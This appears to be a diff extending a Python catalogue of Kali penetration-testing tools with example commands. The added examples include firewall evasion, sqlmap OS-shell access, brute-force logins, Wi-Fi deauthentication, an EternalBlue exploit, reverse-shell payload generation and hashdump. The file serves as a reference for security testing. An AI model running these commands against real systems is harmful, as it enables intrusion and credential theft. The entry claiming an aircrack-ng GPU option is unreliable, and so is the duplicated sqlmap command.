@@ -43,7 +43,7 @@ KALI_TOOLS = [
     {
         "name": "nmap",
         "category": "Information Gathering",
-        "description": "Network exploration tool and security / port scanner",
+        "description": "Network exploration tool and security / port scanner with extensive capabilities for discovery and security auditing",
         "common_usage": "nmap [scan type] [options] {target}",
         "examples": [
             {"description": "Basic scan", "command": "nmap 192.168.1.1"},
@@ -51,7 +51,17 @@ KALI_TOOLS = [
             {"description": "Aggressive scan", "command": "nmap -A 192.168.1.1"},
             {"description": "OS detection", "command": "nmap -O 192.168.1.1"},
             {"description": "Service version detection", "command": "nmap -sV 192.168.1.1"},
-            {"description": "Script scan", "command": "nmap --script=default 192.168.1.1"}
+            {"description": "Script scan", "command": "nmap --script=default 192.168.1.1"},
+            {"description": "SYN Stealth scan", "command": "nmap -sS 192.168.1.0/24"},
+            {"description": "UDP port scan", "command": "nmap -sU 192.168.1.1"},
+            {"description": "Fast scan of most common ports", "command": "nmap -F 192.168.1.1"},
+            {"description": "Full port scan", "command": "nmap -p- 192.168.1.1"},
+            {"description": "Specific port scan", "command": "nmap -p 22,80,443 192.168.1.1"},
+            {"description": "Scan with timing template", "command": "nmap -T4 192.168.1.0/24"},
+            {"description": "Vulnerability scan", "command": "nmap --script vuln 192.168.1.1"},
+            {"description": "Save output to file", "command": "nmap -oA results 192.168.1.1"},
+            {"description": "Evade firewalls", "command": "nmap -sS -Pn -D RND:5 --spoof-mac 0 192.168.1.1"},
+            {"description": "Service enumeration", "command": "nmap -sV --version-intensity 9 192.168.1.1"}
         ]
     },
     {
@@ -114,11 +124,25 @@ KALI_TOOLS = [
     {
         "name": "sqlmap",
         "category": "Web Application Analysis",
-        "description": "Automatic SQL injection tool",
+        "description": "Automatic SQL injection tool for detecting and exploiting SQL injection flaws and taking over database servers",
         "common_usage": "sqlmap -u {url} [options]",
         "examples": [
             {"description": "Basic scan", "command": "sqlmap -u \"http://example.com/page.php?id=1\""},
-            {"description": "Dump database", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --dump"}
+            {"description": "Dump database", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --dump"},
+            {"description": "List databases", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --dbs"},
+            {"description": "Target specific database", "command": "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname --tables"},
+            {"description": "List tables in database", "command": "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname --tables"},
+            {"description": "Get columns of a table", "command": "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname -T tablename --columns"},
+            {"description": "Dump table data", "command": "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname -T tablename --dump"},
+            {"description": "Use POST request", "command": "sqlmap -u \"http://example.com/login.php\" --data=\"username=test&password=test\""},
+            {"description": "Use cookie", "command": "sqlmap -u \"http://example.com/admin/\" --cookie=\"PHPSESSID=1234abcd\""},
+            {"description": "Test form auto-detection", "command": "sqlmap -u \"http://example.com/login.php\" --forms"},
+            {"description": "Use HTTP authentication", "command": "sqlmap -u \"http://example.com/admin/\" --auth-type=basic --auth-cred=\"admin:password\""},
+            {"description": "Use proxy", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --proxy=http://127.0.0.1:8080"},
+            {"description": "Run OS commands", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --os-cmd=\"id\""},
+            {"description": "Get shell", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --os-shell"},
+            {"description": "Use Tor anonymity", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --tor --tor-type=socks5"},
+            {"description": "Crawl site for injection points", "command": "sqlmap -u \"http://example.com/\" --crawl=3"}
         ]
     },
     {
@@ -146,11 +170,21 @@ KALI_TOOLS = [
     {
         "name": "hydra",
         "category": "Password Attacks",
-        "description": "Parallelized login cracker which supports numerous protocols",
-        "common_usage": "hydra -l {username} -P {passwordlist} {target} {protocol}",
+        "description": "Parallelized login cracker which supports numerous protocols and services for brute force attacks",
+        "common_usage": "hydra -l {username}|-L {userlist} -p {password}|-P {passwordlist} {target} {protocol}",
         "examples": [
             {"description": "SSH attack", "command": "hydra -l admin -P /path/to/wordlist.txt ssh://192.168.1.1"},
-            {"description": "Web form attack", "command": "hydra -l admin -P /path/to/wordlist.txt http-post-form \"login.php:username=^USER^&password=^PASS^:Login failed\""}
+            {"description": "Web form attack", "command": "hydra -l admin -P /path/to/wordlist.txt http-post-form \"login.php:username=^USER^&password=^PASS^:Login failed\""},
+            {"description": "FTP attack", "command": "hydra -L users.txt -P passwords.txt ftp://192.168.1.1"},
+            {"description": "SMB attack", "command": "hydra -l administrator -P /path/to/wordlist.txt smb://192.168.1.1"},
+            {"description": "RDP attack", "command": "hydra -L users.txt -P passwords.txt rdp://192.168.1.1"},
+            {"description": "HTTP basic auth", "command": "hydra -L users.txt -P passwords.txt http-get://192.168.1.1/admin/"},
+            {"description": "MySQL attack", "command": "hydra -l root -P passwords.txt mysql://192.168.1.1"},
+            {"description": "SMTP attack", "command": "hydra -l user@example.com -P passwords.txt smtp://mail.example.com"},
+            {"description": "Attack with verbose output", "command": "hydra -v -l admin -P passwords.txt ssh://192.168.1.1"},
+            {"description": "Limit parallel tasks", "command": "hydra -t 4 -l admin -P passwords.txt ssh://192.168.1.1"},
+            {"description": "Continue from last attempt", "command": "hydra -R -l admin -P large_wordlist.txt ssh://192.168.1.1"},
+            {"description": "Use proxy", "command": "hydra -l admin -P passwords.txt -s 8080 http-proxy://192.168.1.1"}
         ]
     },
     {
@@ -178,11 +212,19 @@ KALI_TOOLS = [
     {
         "name": "aircrack-ng",
         "category": "Wireless Attacks",
-        "description": "Complete suite for auditing wireless networks",
+        "description": "Complete suite for auditing wireless networks, including packet capture, attack, testing, and cracking",
         "common_usage": "aircrack-ng [options] <capture file(s)>",
         "examples": [
             {"description": "WPA handshake crack", "command": "aircrack-ng -w /path/to/wordlist.txt capture.cap"},
-            {"description": "WEP key crack", "command": "aircrack-ng -a 1 -b 00:11:22:33:44:55 capture.cap"}
+            {"description": "WEP key crack", "command": "aircrack-ng -a 1 -b 00:11:22:33:44:55 capture.cap"},
+            {"description": "Start monitor mode", "command": "airmon-ng start wlan0"},
+            {"description": "Scan for networks", "command": "airodump-ng wlan0mon"},
+            {"description": "Targeted network capture", "command": "airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w capture wlan0mon"},
+            {"description": "Deauthenticate clients", "command": "aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c FF:FF:FF:FF:FF:FF wlan0mon"},
+            {"description": "Filter by ESSID", "command": "aircrack-ng -e \"TargetNetwork\" -w /path/to/wordlist.txt capture.cap"},
+            {"description": "Crack with GPU acceleration", "command": "aircrack-ng -w /path/to/wordlist.txt -b 00:11:22:33:44:55 --gpu-accel=N capture.cap"},
+            {"description": "WPA attack with hashcat format", "command": "aircrack-ng -J output_hashcat capture.cap"},
+            {"description": "WPS PIN attack", "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -vv"}
         ]
     },
     {
@@ -200,11 +242,23 @@ KALI_TOOLS = [
     {
         "name": "metasploit",
         "category": "Exploitation Tools",
-        "description": "Advanced open-source platform for developing, testing, and executing exploits",
-        "common_usage": "msfconsole",
+        "description": "Advanced open-source platform for developing, testing, and executing exploits against target systems",
+        "common_usage": "msfconsole [options]",
         "examples": [
             {"description": "Start Metasploit", "command": "msfconsole"},
-            {"description": "Use a module", "command": "use exploit/multi/handler"}
+            {"description": "Use a module", "command": "use exploit/multi/handler"},
+            {"description": "Start with resource script", "command": "msfconsole -r script.rc"},
+            {"description": "Quiet mode", "command": "msfconsole -q"},
+            {"description": "Set up reverse shell handler", "command": "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; run"},
+            {"description": "Search for exploits", "command": "search type:exploit platform:windows cve:2021"},
+            {"description": "Exploit a target", "command": "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; exploit"},
+            {"description": "Database integration with nmap", "command": "db_nmap -sV 192.168.1.0/24"},
+            {"description": "List discovered hosts", "command": "hosts"},
+            {"description": "List discovered services", "command": "services"},
+            {"description": "List vulnerabilities", "command": "vulns"},
+            {"description": "Generate a payload", "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe"},
+            {"description": "Load auxiliary module", "command": "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run"},
+            {"description": "Post-exploitation command", "command": "run post/windows/gather/hashdump"}
         ]
     },
     {
@@ -280,6 +334,26 @@ KALI_TOOLS = [
         "common_usage": "dradis",
         "examples": [
             {"description": "Start Dradis", "command": "dradis"}
+        ]
+    },
+    {
+        "name": "ffuf",
+        "category": "Web Application Analysis",
+        "description": "Fast web fuzzer for discovering hidden files, directories, subdomains, and parameters in web applications",
+        "common_usage": "ffuf -w {wordlist} -u {url}",
+        "examples": [
+            {"description": "Directory discovery", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ"},
+            {"description": "File discovery", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ.php"},
+            {"description": "Subdomain enumeration", "command": "ffuf -w /path/to/wordlist.txt -u http://FUZZ.example.com"},
+            {"description": "Parameter discovery", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/script.php?FUZZ=test"},
+            {"description": "Value fuzzing", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/script.php?id=FUZZ"},
+            {"description": "POST data fuzzing", "command": "ffuf -w /path/to/wordlist.txt -X POST -d \"username=admin&password=FUZZ\" -u http://example.com/login"},
+            {"description": "Filter by size", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -fs 4242"},
+            {"description": "Filter by status code", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -fc 404"},
+            {"description": "Multiple wordlists", "command": "ffuf -w user.txt:USER -w pass.txt:PASS -u http://example.com/login -X POST -d \"username=USER&password=PASS\""},
+            {"description": "Recursion", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -recursion"},
+            {"description": "Use custom headers", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -H \"X-Forwarded-For: 127.0.0.1\""},
+            {"description": "Output to file", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -o results.json -of json"}
         ]
     }
     # Many more tools can be added here...
